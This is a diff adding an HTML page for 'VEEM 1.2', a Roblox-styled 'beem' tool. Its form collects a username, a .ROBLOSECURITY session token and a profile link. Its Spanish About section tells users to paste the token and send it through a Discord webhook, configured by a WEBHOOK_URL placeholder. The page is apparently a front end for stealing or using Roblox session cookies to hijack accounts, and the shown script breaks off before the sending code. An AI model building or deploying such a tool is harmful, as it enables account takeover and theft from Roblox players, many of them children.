@@ -1,0 +1,1799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VEEM 1.2 - Beem Tool</title>
+    <style>
+        :root {
+            --color-primary: #E62C2C;
+            --color-secondary: #D12828;
+            --color-button: #F04747;
+            --color-accent: #F04747;
+            --color-text: #FFFFFF;
+            --color-text-light: #B0B0B0;
+            --bg-gradient: linear-gradient(135deg, #1B1B1B 0%, #232323 50%, #2A2A2A 100%);
+            --glass-tint: rgba(230, 44, 44, 0.1);
+            --particle-color-1: #E62C2C;
+            --particle-color-2: #D12828;
+            --particle-color-3: #F04747;
+            --blur-intensity: 8px;
+            --glow-color: rgba(230, 44, 44, 0.4);
+            --transition-speed: 0.6s;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            min-height: 100vh;
+            background: var(--bg-gradient);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+            animation: fadeIn 0.6s ease-out;
+            transition: background var(--transition-speed) ease;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, var(--glow-color) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, var(--glow-color) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, var(--glow-color) 0%, transparent 50%);
+            animation: gradientShift 20s ease infinite;
+            opacity: 0.6;
+            pointer-events: none;
+        }
+
+        @keyframes gradientShift {
+            0%, 100% {
+                opacity: 0.6;
+                filter: hue-rotate(0deg);
+            }
+            50% {
+                opacity: 0.8;
+                filter: hue-rotate(20deg);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* Floating particles */
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            pointer-events: none;
+            opacity: 0.4;
+            filter: blur(2px);
+            box-shadow: 0 0 20px currentColor;
+        }
+
+        .particle::before {
+            content: '';
+            position: absolute;
+            top: 10%;
+            left: 10%;
+            width: 40%;
+            height: 40%;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            filter: blur(3px);
+        }
+
+        @keyframes floatParticle {
+            0%, 100% {
+                transform: translate(0, 0) scale(1);
+            }
+            33% {
+                transform: translate(var(--tx1), var(--ty1)) scale(1.2);
+            }
+            66% {
+                transform: translate(var(--tx2), var(--ty2)) scale(0.8);
+            }
+        }
+
+        /* Geometric decorative shapes */
+        .geo-shape {
+            position: absolute;
+            opacity: 0.15;
+            animation: rotate 30s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes rotate {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .triangle {
+            width: 0;
+            height: 0;
+            border-left: 50px solid transparent;
+            border-right: 50px solid transparent;
+            border-bottom: 86px solid var(--color-primary);
+        }
+
+        .hexagon {
+            width: 80px;
+            height: 46px;
+            background: var(--color-secondary);
+            position: relative;
+        }
+
+        .hexagon::before,
+        .hexagon::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            border-left: 40px solid transparent;
+            border-right: 40px solid transparent;
+        }
+
+        .hexagon::before {
+            bottom: 100%;
+            border-bottom: 23px solid var(--color-secondary);
+        }
+
+        .hexagon::after {
+            top: 100%;
+            border-top: 23px solid var(--color-secondary);
+        }
+
+        /* Main container */
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 500px;
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* Roblox-style solid card */
+        .form-card {
+            background: rgba(35, 35, 35, 0.95);
+            backdrop-filter: blur(var(--blur-intensity));
+            -webkit-backdrop-filter: blur(var(--blur-intensity));
+            border-radius: 6px;
+            padding: 45px;
+            box-shadow: 
+                0 8px 32px rgba(230, 44, 44, 0.3),
+                0 0 60px rgba(230, 44, 44, 0.2);
+            border: 3px solid #E62C2C;
+            position: relative;
+            overflow: visible;
+            transition: all var(--transition-speed) ease;
+        }
+
+        .form-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(230, 44, 44, 0.1),
+                transparent
+            );
+            animation: shimmer 10s infinite;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        @keyframes shimmer {
+            0% {
+                left: -100%;
+            }
+            50%, 100% {
+                left: 200%;
+            }
+        }
+        
+        .form-card > * {
+            position: relative;
+            z-index: 1;
+        }
+
+        .form-card::after {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            border-radius: 6px;
+            padding: 3px;
+            background: linear-gradient(
+                145deg,
+                rgba(230, 44, 44, 0.6),
+                rgba(230, 44, 44, 0.3),
+                rgba(230, 44, 44, 0.6)
+            );
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            animation: borderGlow 3s ease infinite;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        @keyframes borderGlow {
+            0%, 100% {
+                opacity: 0.5;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .title {
+            font-size: 42px;
+            font-weight: 800;
+            color: var(--color-text);
+            margin-bottom: 15px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .title-version {
+            color: var(--color-primary);
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--color-text-light);
+            line-height: 1.6;
+        }
+
+        .subtitle a {
+            color: #F04747;
+            text-decoration: none;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 10px rgba(240, 71, 71, 0.5);
+        }
+
+        .subtitle a:hover {
+            color: #E62C2C;
+            text-shadow: 0 0 20px rgba(230, 44, 44, 0.8);
+        }
+
+        /* Form styles with floating labels */
+        .form-group {
+            margin-bottom: 28px;
+            position: relative;
+        }
+
+        .form-label {
+            position: absolute;
+            left: 20px;
+            top: 16px;
+            color: rgba(176, 176, 176, 0.7);
+            font-size: 15px;
+            font-weight: 500;
+            pointer-events: none;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            background: transparent;
+            padding: 0 4px;
+            z-index: 1;
+        }
+
+        .form-group.focused .form-label,
+        .form-group.filled .form-label {
+            top: -10px;
+            left: 16px;
+            font-size: 12px;
+            color: #E62C2C;
+            background: #232323;
+            font-weight: 600;
+        }
+
+        .form-help {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            background: rgba(230, 44, 44, 0.2);
+            border: 2px solid #E62C2C;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #E62C2C;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: help;
+            opacity: 0;
+            transition: all 0.3s ease;
+            z-index: 2;
+        }
+
+        .form-group:hover .form-help,
+        .form-group.focused .form-help {
+            opacity: 1;
+        }
+
+        .form-help::after {
+            content: attr(data-tooltip);
+            position: absolute;
+            bottom: calc(100% + 8px);
+            right: 0;
+            background: rgba(35, 35, 35, 0.98);
+            color: #FFFFFF;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            white-space: nowrap;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+            border: 2px solid #E62C2C;
+            box-shadow: 0 4px 12px rgba(230, 44, 44, 0.3);
+            font-weight: 500;
+        }
+
+        .form-help:hover::after {
+            opacity: 1;
+        }
+
+        .form-input,
+        .form-textarea {
+            width: 100%;
+            padding: 16px 45px 16px 20px;
+            border: 2px solid rgba(87, 89, 91, 0.8);
+            border-radius: 6px;
+            font-size: 15px;
+            font-family: inherit;
+            font-weight: 500;
+            background: rgba(47, 49, 54, 0.9);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            color: #FFFFFF;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            outline: none;
+            position: relative;
+            box-shadow: none;
+        }
+
+        .form-input:focus,
+        .form-textarea:focus {
+            border-color: #E62C2C;
+            background: rgba(47, 49, 54, 0.95);
+            box-shadow: 
+                0 0 25px rgba(230, 44, 44, 0.5),
+                0 0 40px rgba(230, 44, 44, 0.3),
+                inset 0 0 15px rgba(230, 44, 44, 0.15);
+            transform: translateY(-2px);
+        }
+
+        .form-input::placeholder,
+        .form-textarea::placeholder {
+            color: rgba(102, 102, 102, 0.6);
+        }
+
+        .form-textarea {
+            min-height: 140px;
+            resize: vertical;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* Button container for layout */
+        .button-group {
+            display: flex;
+            gap: 16px;
+            margin-top: 10px;
+        }
+
+        @media (max-width: 600px) {
+            .button-group {
+                flex-direction: column;
+            }
+        }
+
+        /* Giant Roblox-style button with bounce */
+        .submit-btn {
+            flex: 1;
+            padding: 22px;
+            background: linear-gradient(135deg, #E62C2C 0%, #F04747 50%, #E62C2C 100%);
+            background-size: 200% 100%;
+            animation: buttonGradient 3s ease infinite, buttonBounce 2s ease infinite;
+            color: white;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 
+                0 4px 20px rgba(230, 44, 44, 0.5),
+                0 0 40px rgba(230, 44, 44, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes buttonGradient {
+            0%, 100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        @keyframes buttonBounce {
+            0%, 100% {
+                transform: translateY(0) scale(1);
+            }
+            50% {
+                transform: translateY(-2px) scale(1.005);
+            }
+        }
+
+        .submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.25);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s ease, height 0.6s ease;
+            z-index: 0;
+        }
+
+        .submit-btn:hover::before {
+            width: 400px;
+            height: 400px;
+        }
+        
+        .submit-btn > * {
+            position: relative;
+            z-index: 1;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-4px) scale(1.03);
+            box-shadow: 
+                0 8px 40px rgba(230, 44, 44, 0.7),
+                0 0 80px rgba(230, 44, 44, 0.5);
+            animation: buttonGradient 1.5s ease infinite, buttonPulse 0.5s ease infinite;
+        }
+
+        @keyframes buttonPulse {
+            0%, 100% {
+                box-shadow: 
+                    0 8px 40px rgba(230, 44, 44, 0.7),
+                    0 0 80px rgba(230, 44, 44, 0.5);
+            }
+            50% {
+                box-shadow: 
+                    0 8px 40px rgba(230, 44, 44, 0.9),
+                    0 0 100px rgba(230, 44, 44, 0.7);
+            }
+        }
+
+        .submit-btn:active {
+            transform: translateY(-1px) scale(0.98);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Clear button - secondary style */
+        .clear-btn {
+            flex: 1;
+            padding: 18px;
+            background: rgba(230, 44, 44, 0.1);
+            color: #FFFFFF;
+            border: 2px solid #E62C2C;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 10px rgba(230, 44, 44, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .clear-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(230, 44, 44, 0.2);
+            transform: translate(-50%, -50%);
+            transition: width 0.5s ease, height 0.5s ease;
+            z-index: 0;
+        }
+
+        .clear-btn:hover::before {
+            width: 400px;
+            height: 400px;
+        }
+
+        .clear-btn > * {
+            position: relative;
+            z-index: 1;
+        }
+
+        .clear-btn:hover {
+            background: rgba(230, 44, 44, 0.2);
+            border-color: #F04747;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px rgba(230, 44, 44, 0.4);
+        }
+
+        .clear-btn:active {
+            transform: translateY(0);
+        }
+
+        /* Enhanced loading spinner wheel */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top-color: white;
+            border-right-color: white;
+            border-radius: 50%;
+            animation: spinWheel 0.6s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        @keyframes spinWheel {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Full screen loader */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .loader-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .loader-wheel {
+            width: 80px;
+            height: 80px;
+            border: 6px solid rgba(230, 44, 44, 0.2);
+            border-top-color: #E62C2C;
+            border-right-color: #F04747;
+            border-radius: 50%;
+            animation: spinWheel 0.8s linear infinite;
+            box-shadow: 0 0 40px rgba(230, 44, 44, 0.6);
+            margin-bottom: 20px;
+        }
+
+        .loader-text {
+            color: #FFFFFF;
+            font-size: 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: pulse 1.5s ease infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.6;
+            }
+        }
+
+        /* Liquid glass toast notification */
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(35, 35, 35, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 16px 24px;
+            border-radius: 8px;
+            box-shadow: 
+                0 8px 32px rgba(230, 44, 44, 0.3),
+                0 0 0 2px rgba(230, 44, 44, 0.3) inset;
+            border: 2px solid rgba(230, 44, 44, 0.4);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            z-index: 10000;
+            animation: slideInRight 0.3s ease-out;
+            max-width: 90%;
+            color: #FFFFFF;
+        }
+
+        @keyframes slideInRight {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .toast.success {
+            border-left: 5px solid #4CAF50;
+            box-shadow: 
+                0 8px 32px rgba(76, 175, 80, 0.3),
+                0 0 40px rgba(76, 175, 80, 0.2);
+        }
+
+        .toast.error {
+            border-left: 5px solid #f44336;
+            box-shadow: 
+                0 8px 32px rgba(244, 67, 54, 0.3),
+                0 0 40px rgba(244, 67, 54, 0.2);
+        }
+
+        .toast-icon {
+            font-size: 20px;
+        }
+
+        /* About Modal */
+        .about-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .about-modal.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .about-content {
+            background: rgba(35, 35, 35, 0.98);
+            border: 3px solid #E62C2C;
+            border-radius: 6px;
+            max-width: 600px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            padding: 40px;
+            position: relative;
+            box-shadow: 
+                0 10px 40px rgba(230, 44, 44, 0.4),
+                0 0 80px rgba(230, 44, 44, 0.3);
+            animation: slideUp 0.4s ease;
+        }
+
+        .about-close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            width: 36px;
+            height: 36px;
+            background: rgba(230, 44, 44, 0.2);
+            border: 2px solid #E62C2C;
+            border-radius: 4px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #E62C2C;
+            font-size: 24px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .about-close:hover {
+            background: #E62C2C;
+            color: white;
+            transform: scale(1.1);
+        }
+
+        .about-title {
+            font-size: 32px;
+            font-weight: 800;
+            color: #E62C2C;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .about-section {
+            margin-bottom: 25px;
+            padding: 20px;
+            border-bottom: 2px solid rgba(230, 44, 44, 0.2);
+            background: rgba(230, 44, 44, 0.05);
+            border-radius: 8px;
+            border: 2px solid rgba(230, 44, 44, 0.15);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .about-section:hover {
+            background: rgba(230, 44, 44, 0.1);
+            border-color: rgba(230, 44, 44, 0.3);
+            transform: translateX(5px);
+        }
+
+        .about-icon {
+            font-size: 32px;
+            margin-bottom: 12px;
+            display: inline-block;
+            animation: iconBounce 2s ease infinite;
+        }
+
+        @keyframes iconBounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-5px);
+            }
+        }
+
+        .about-section:last-child {
+            border-bottom: none;
+        }
+
+        .about-section h3 {
+            color: #F04747;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .about-section p {
+            color: #B0B0B0;
+            line-height: 1.7;
+            margin-bottom: 10px;
+        }
+
+        .about-section ul {
+            list-style: none;
+            padding: 0;
+            margin: 10px 0;
+        }
+
+        .about-section li {
+            color: #B0B0B0;
+            line-height: 1.8;
+            padding-left: 25px;
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        .about-section li::before {
+            content: "▸";
+            position: absolute;
+            left: 0;
+            color: #E62C2C;
+            font-weight: bold;
+        }
+
+        .about-section ol {
+            list-style: none;
+            counter-reset: step-counter;
+            padding: 0;
+            margin: 10px 0;
+        }
+
+        .about-section ol li {
+            counter-increment: step-counter;
+            padding-left: 35px;
+        }
+
+        .about-section ol li::before {
+            content: counter(step-counter) ".";
+            left: 0;
+            color: #E62C2C;
+            font-weight: 700;
+        }
+
+        /* Roblox corner accents */
+        .roblox-corner {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #E62C2C;
+            pointer-events: none;
+            opacity: 0;
+            transition: all 0.6s ease;
+            box-shadow: 0 0 15px rgba(230, 44, 44, 0.4);
+            z-index: 10;
+        }
+
+        .roblox-corner.active {
+            opacity: 0.8;
+        }
+        
+        .form-card:hover .roblox-corner.active {
+            opacity: 1;
+            box-shadow: 0 0 25px rgba(230, 44, 44, 0.6);
+        }
+
+        .roblox-corner.top-left {
+            top: -3px;
+            left: -3px;
+            border-right: none;
+            border-bottom: none;
+            border-top-left-radius: 6px;
+        }
+
+        .roblox-corner.top-right {
+            top: -3px;
+            right: -3px;
+            border-left: none;
+            border-bottom: none;
+            border-top-right-radius: 6px;
+        }
+
+        .roblox-corner.bottom-left {
+            bottom: -3px;
+            left: -3px;
+            border-right: none;
+            border-top: none;
+            border-bottom-left-radius: 6px;
+        }
+
+        .roblox-corner.bottom-right {
+            bottom: -3px;
+            right: -3px;
+            border-left: none;
+            border-top: none;
+            border-bottom-right-radius: 6px;
+        }
+
+        /* Responsive design */
+        @media (max-width: 600px) {
+            .form-card {
+                padding: 30px 25px;
+                border-radius: 25px;
+            }
+
+            .title {
+                font-size: 36px;
+            }
+
+            .subtitle {
+                font-size: 13px;
+            }
+
+            .toast {
+                top: 10px;
+                right: 10px;
+                left: 10px;
+                max-width: calc(100% - 20px);
+            }
+
+            .about-content {
+                padding: 30px 25px;
+            }
+
+            .about-title {
+                font-size: 26px;
+            }
+
+            .particle {
+                display: none;
+            }
+            
+            .form-help {
+                display: none;
+            }
+            
+            .loader-wheel {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .about-section:hover {
+                transform: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- About Modal -->
+    <div class="about-modal" id="aboutModal">
+        <div class="about-content">
+            <div class="about-close" id="closeModal">&times;</div>
+            <h2 class="about-title">Sobre VEEM 1.2</h2>
+            
+            <div class="about-section">
+                <div class="about-icon">🎯</div>
+                <h3>¿Qué es VEEM?</h3>
+                <p>Sistema de gestión y verificación inspirado en Roblox para administrar credenciales de usuarios con seguridad.</p>
+            </div>
+
+            <div class="about-section">
+                <div class="about-icon">✨</div>
+                <h3>Características</h3>
+                <ul>
+                    <li>Transmisión segura con webhooks Discord</li>
+                    <li>Notificación UI en tiempo real</li>
+                    <li>Interfaz tipo Roblox intuitiva y moderna</li>
+                    <li>Animaciones, loaders y efectos pro</li>
+                    <li>Validación y feedback instantáneo</li>
+                </ul>
+            </div>
+
+            <div class="about-section">
+                <div class="about-icon">📋</div>
+                <h3>Cómo usar</h3>
+                <ol>
+                    <li>Ingresa el username</li>
+                    <li>Pega el token ROBLOSECURITY (área de texto)</li>
+                    <li>Coloca el link de usuario</li>
+                    <li>Presiona "Beem User" para enviar</li>
+                </ol>
+            </div>
+
+            <div class="about-section">
+                <div class="about-icon">💬</div>
+                <h3>Soporte</h3>
+                <p>Contacta al admin ante dudas.<br>Última actualización: octubre 2025</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Decorative geometric shapes -->
+    <div class="geo-shape" style="top: 10%; left: 5%;">
+        <div class="triangle"></div>
+    </div>
+    <div class="geo-shape" style="bottom: 15%; right: 8%; animation-delay: -5s;">
+        <div class="hexagon"></div>
+    </div>
+    <div class="geo-shape" style="top: 60%; left: 85%; animation-delay: -10s;">
+        <div class="triangle"></div>
+    </div>
+
+    <!-- Floating particles container -->
+    <div id="particles-container"></div>
+
+    <!-- Loader overlay -->
+    <div class="loader-overlay" id="loaderOverlay">
+        <div class="loader-wheel"></div>
+        <div class="loader-text">Processing...</div>
+    </div>
+
+    <!-- Audio elements for sound effects -->
+    <audio id="soundClick" preload="auto">
+        <source src="data:audio/wav;base64,UklGRhQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=" type="audio/wav">
+    </audio>
+    <audio id="soundSuccess" preload="auto">
+        <source src="data:audio/wav;base64,UklGRhQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=" type="audio/wav">
+    </audio>
+    <audio id="soundError" preload="auto">
+        <source src="data:audio/wav;base64,UklGRhQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=" type="audio/wav">
+    </audio>
+    <audio id="soundPopup" preload="auto">
+        <source src="data:audio/wav;base64,UklGRhQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=" type="audio/wav">
+    </audio>
+
+    <!-- Main container -->
+    <div class="container">
+        <div class="form-card">
+            <!-- Roblox corner accents -->
+            <div class="roblox-corner top-left"></div>
+            <div class="roblox-corner top-right"></div>
+            <div class="roblox-corner bottom-left"></div>
+            <div class="roblox-corner bottom-right"></div>
+            <div class="header">
+                <h1 class="title">VEEM <span class="title-version">1.2</span></h1>
+                <p class="subtitle">
+                    Use this tool to beem people. Remember if you have any questions about how to use it visit <a href="#" id="aboutLink">About</a>
+                </p>
+            </div>
+
+            <form id="veemForm">
+                <div class="form-group">
+                    <label class="form-label" for="username">Username</label>
+                    <input 
+                        type="text" 
+                        id="username" 
+                        class="form-input" 
+                        placeholder=" "
+                        autocomplete="off"
+                        required
+                    >
+                    <div class="form-help" data-tooltip="Enter the Roblox username">?</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="roblosecurity">ROBLOSECURITY Token</label>
+                    <textarea 
+                        id="roblosecurity" 
+                        class="form-textarea" 
+                        placeholder=" "
+                        required
+                    ></textarea>
+                    <div class="form-help" data-tooltip="Paste the full security token" style="top: 20px;">?</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="userlink">User Profile Link</label>
+                    <input 
+                        type="text" 
+                        id="userlink" 
+                        class="form-input" 
+                        placeholder=" "
+                        autocomplete="off"
+                        required
+                    >
+                    <div class="form-help" data-tooltip="Full URL to user profile">?</div>
+                </div>
+
+                <div class="button-group">
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        Beem User
+                    </button>
+                    <button type="button" class="clear-btn" id="clearBtn">
+                        Clear Fields
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Sound effects using Web Audio API
+        function playSound(type) {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            if (type === 'click') {
+                oscillator.frequency.value = 800;
+                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
+                oscillator.start(audioContext.currentTime);
+                oscillator.stop(audioContext.currentTime + 0.1);
+            } else if (type === 'success') {
+                oscillator.frequency.value = 1000;
+                gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
+                oscillator.start(audioContext.currentTime);
+                oscillator.frequency.exponentialRampToValueAtTime(1500, audioContext.currentTime + 0.1);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
+                oscillator.stop(audioContext.currentTime + 0.2);
+            } else if (type === 'error') {
+                oscillator.frequency.value = 400;
+                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                oscillator.start(audioContext.currentTime);
+                oscillator.frequency.exponentialRampToValueAtTime(200, audioContext.currentTime + 0.15);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.15);
+                oscillator.stop(audioContext.currentTime + 0.15);
+            } else if (type === 'popup') {
+                oscillator.frequency.value = 600;
+                gainNode.gain.setValueAtTime(0.15, audioContext.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.08);
+                oscillator.start(audioContext.currentTime);
+                oscillator.stop(audioContext.currentTime + 0.08);
+            }
+        }
+
+        // Floating label functionality
+        function initFloatingLabels() {
+            const formGroups = document.querySelectorAll('.form-group');
+            
+            formGroups.forEach(group => {
+                const input = group.querySelector('.form-input, .form-textarea');
+                if (!input) return;
+                
+                // Check if input has value on load
+                if (input.value.trim() !== '') {
+                    group.classList.add('filled');
+                }
+                
+                input.addEventListener('focus', () => {
+                    group.classList.add('focused');
+                });
+                
+                input.addEventListener('blur', () => {
+                    group.classList.remove('focused');
+                    if (input.value.trim() !== '') {
+                        group.classList.add('filled');
+                    } else {
+                        group.classList.remove('filled');
+                    }
+                });
+                
+                input.addEventListener('input', () => {
+                    if (input.value.trim() !== '') {
+                        group.classList.add('filled');
+                    } else {
+                        group.classList.remove('filled');
+                    }
+                });
+            });
+        }
+
+        // Initialize on load
+        document.addEventListener('DOMContentLoaded', initFloatingLabels);
+
+        // About modal functionality
+        const aboutModal = document.getElementById('aboutModal');
+        const aboutLink = document.getElementById('aboutLink');
+        const closeModal = document.getElementById('closeModal');
+
+        // Open modal
+        aboutLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            playSound('popup');
+            aboutModal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        });
+
+        // Close modal
+        closeModal.addEventListener('click', () => {
+            playSound('popup');
+            aboutModal.classList.remove('active');
+            document.body.style.overflow = '';
+        });
+
+        // Close on outside click
+        aboutModal.addEventListener('click', (e) => {
+            if (e.target === aboutModal) {
+                aboutModal.classList.remove('active');
+                document.body.style.overflow = '';
+            }
+        });
+
+        // Close on ESC key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && aboutModal.classList.contains('active')) {
+                aboutModal.classList.remove('active');
+                document.body.style.overflow = '';
+            }
+        });
+
+        // Removed theme configurations (Roblox is now the only theme)
+        const themes = {
+            'roblox-style': {
+                name: 'ROBLOX Style',
+                bgGradient: 'linear-gradient(135deg, #1B1B1B 0%, #232323 50%, #2A2A2A 100%)',
+                primary: '#E62C2C',
+                secondary: '#D12828',
+                accent: '#F04747',
+                glassTint: 'rgba(230, 44, 44, 0.1)',
+                glowColor: 'rgba(230, 44, 44, 0.4)',
+                particleColors: ['#E62C2C', '#D12828', '#F04747'],
+                textColor: '#FFFFFF',
+                cardBg: '#232323',
+                inputBg: '#2F3136',
+                borderRadius: '8px',
+                borderWidth: '3px',
+                blurAmount: '8px',
+                isRoblox: true
+            }
+        };
+
+        // ============================================
+        // WEBHOOK CONFIGURATION
+        // ============================================
+        // AQUÍ IRA TU WEBHOOK - Replace with your Discord webhook URL
+        const WEBHOOK_URL = "AQUÍ IRA TU WEBHOOK";
+        // ============================================
+
+        // Toast notification function
+        function showToast(message, type = 'success') {
+            // Remove existing toasts
+            const existingToast = document.querySelector('.toast');
+            if (existingToast) {
+                existingToast.remove();
+            }
